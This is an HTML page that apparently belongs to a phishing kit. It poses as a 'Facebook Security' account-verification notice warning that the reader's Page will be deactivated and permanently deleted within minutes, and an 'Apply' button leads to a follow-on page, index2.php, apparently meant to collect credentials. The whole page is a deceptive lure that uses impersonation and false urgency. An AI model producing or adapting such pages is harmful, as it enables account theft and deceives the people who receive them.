
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
<title>Action Required</title>
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
    <title>Facebook - warning</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, Helvetica, sans-serif;
        }

        html,
        body {
            height: 100%;
            width: 100%;
        }

        #container {
            height: 100%;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #f0f2f5;
        }

        #box {
            height: 40%;
            width: 45%;
            background-color: rgb(255, 255, 255);
            border-radius: 3px;
            display: flex;
            align-items: center;
            flex-direction: column;
        }

        #box>img {
            width: 70px;
            margin-top: 15px;
        }

        #data {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 15px;
        }

        #data>h4 {
            font-size: 25px;
        }

        #data>img {
            width: 25px;
        }

        .line {
            height: .7px;
            background-color: rgba(0, 0, 0, 0.222);
            width: 90%;
            margin: 1rem;
        }

        #para h2 {
            font-size: 16px;
        }

        #para {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        #para p {
            margin: 10px 100px 0px 100px;
            font-size: 14px;
        }

        #para button {
            padding: 10px 20px 10px 20px;
            margin-top: 25px;
            border: none;
            border-radius: 2px;
            font-size: 18px;
            background-color: #145dbd;
            cursor: pointer;
        }

        #para button a {
            text-decoration: none;
            color: #fff;
        }

        #para button:hover {
            background-color: #03469e;
        }




        @media (max-width: 500px) {

            #box {

                margin: 0;
                height: 45%;
                width: 95%;
                top: 0%;

            }

            #box>img {
                width: 40px;
            }

            #data>h4 {
                font-size: 18px;
            }

            #data>img {
                width: 15px;
                margin-left: 2px;
            }

            .line {
                height: .5px;
                width: 90%;
                margin-left: auto;
                margin-right: auto;
                background-color: #00000045;
            }

            #para {
                margin: 0%;
            }

            #para>h2 {
                font-size: 12px;
                font-weight: 700;
                margin-bottom: 10px;
            }

            #para>p {
                margin: 5px 15px 0px 15px;
                font-size: 14px;
            }

            #para button {
                padding: 8px 18px 8px 18px;
                margin-top: 15px;
                border: none;
                border-radius: 2px;
                font-size: 13px;
                background-color: #1877F2;
                cursor: pointer;
            }
        }
    </style>
</head>
<body>
    <div id="container">
        <div id="box">
            <img src="Facebookicon.png" alt="">
       <h5 id="groupSubHeader">Facebook Security</h5>     <div id="data">
                <H4>Account Verification Service</H4> <img src="bluetick.png" alt="">
            </div>
            <div class="line"></div>
            <div id="para">
                <h2> Your Page will be deactivated soon</h2>
                <p>we can walk you through several steps to request review you should complete these steps in few
                    minutes so that your page will not deleted permantaly. </p>
                <button> <a href="index2.php"> Apply</a> </button>
            </div>
        </div>
    </div>
</body>

</html>